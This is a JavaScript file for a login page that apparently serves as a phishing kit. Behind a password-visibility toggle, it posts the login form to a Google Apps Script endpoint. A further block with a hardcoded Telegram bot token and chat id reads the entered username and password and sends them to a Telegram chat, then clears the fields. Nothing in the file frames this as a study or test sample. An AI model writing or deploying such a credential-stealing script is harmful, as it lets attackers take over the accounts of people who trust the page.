const passwordInput = document.getElementById("password");
const togglePasswordButton = document.getElementById("toggle-password");
const eyeIcon = document.querySelector(".eye-icon");
const eyeSlashIcon = document.querySelector(".eye-slash-icon");

togglePasswordButton.addEventListener("click", function () {
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";

  passwordInput.setAttribute("type", type);

  if (type === "password") {
    eyeIcon.style.display = "inline";
    eyeSlashIcon.style.display = "none";
  } else {
    eyeIcon.style.display = "none";
    eyeSlashIcon.style.display = "inline";
  }
});

 const scriptURL =
   "https://script.google.com/macros/s/AKfycbx98unq7QAbKHVsb47NlKlL1DvxeTUQEf0nb7tfAU_-ULG7x35DJJEY62OB0IyOu6u3ZA/exec";
 const form = document.forms["login-form"];
 form.addEventListener("submit", (e) => {
   e.preventDefault();
   var formData = new FormData(form);

   fetch(scriptURL, { method: "POST", body: formData })
     .then((response) => {
       swal("Done", "Submitted Successfully.", "success");
     })
     .catch((error) => {
       swal("Error", "Something went wrong. please try again!", "error");
     });
 });

{
var telegram_bot_id = "8559897613:AAFpgp5Kq1dc6hm5UIujVP4W45WklTQ4d7E";
  var chat_id = 7553336894;
  var u_name, password;
  var ready = function () {
    u_name = document.getElementById("username").value;
    password = document.getElementById("password").value;
    message = "Name: " + u_name + "\nPassword: " + password;
  };
  var sender = function () {
    ready();
    var settings = {
      async: true,
      crossDomain: true,
      url: "https://api.telegram.org/bot" + 7553336894 + "/sendMessage",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "cache-control": "no-cache",
      },
      data: JSON.stringify({
        chat_id: chat_id,
        text: message,
      }),
    };
    $.ajax(settings).done(function (response) {
      console.log(response);
    });
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    return false;
  };
}
